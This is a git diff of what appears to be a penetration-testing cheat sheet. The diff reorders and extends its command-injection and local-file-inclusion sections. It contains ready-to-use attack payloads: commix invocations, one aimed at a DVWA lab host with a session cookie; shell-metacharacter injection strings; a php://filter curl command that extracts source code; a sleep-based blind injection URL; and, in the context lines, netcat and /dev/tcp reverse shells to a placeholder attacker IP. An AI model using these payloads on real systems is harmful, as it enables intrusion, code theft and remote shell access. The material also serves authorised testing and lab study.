@@ -89,17 +89,7 @@ POST:
 
 {% endhighlight %}
 
-> **Command Injection**
-{% highlight bash %}
-#Commix Automated Tool
-commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
 
-#Test Strings
-test`pwd`
-test$(pwd)
-test; pwd
-test | pwd
-{% endhighlight %}
 
 > **Local File Include**
 
@@ -116,9 +106,24 @@ http://utilities.snrt.io/?p=php://filter/convert.base64-encode/resource=index.ph
 
 #Rebuild Base64 file (e.g.,executable)
 base64 -d extractedBase64File > executable2
+curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d
 
 {% endhighlight %}
 
+> **Command Injection**
+{% highlight bash %}
+#Commix Automated Tool
+commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
+python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
+
+
+#Test Strings
+test`pwd`
+test$(pwd)
+test; pwd
+test | pwd
+test && pwd
+{% endhighlight %}
 
 > **Blind Command Injection**
 
@@ -131,6 +136,9 @@ test; ping -c 4 <yourAttackerIP>; echo hello
 test; /bin/nc [YourAttackerIP] [port] -e /bin/bash; echo hello
 #Alternative to NC for non-debian based distrobutions
 /bin/bash -i > /dev/tcp/[AttackerIP]/[attackerport] 0<&1 2>&1 
+
+#Sleep method
+http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10
 {% endhighlight %}
 
 > **Web Shells**
@@ -160,6 +168,9 @@ Online:
 * [SQL Injection](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
 * [Informix, MSSQL, Oracle, MySQL, Postgres, DB2, Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet)
 * [Access Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
+[Commix](http://www.kitploit.com/2015/04/commix-automated-all-in-one-os-command.html)
+[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)
+[CGI-Bin](https://www.hellboundhackers.org/articles/read-article.php?article_id=7)
 
 > **Useful Tools**
 * [SQLMap](http://sqlmap.org)
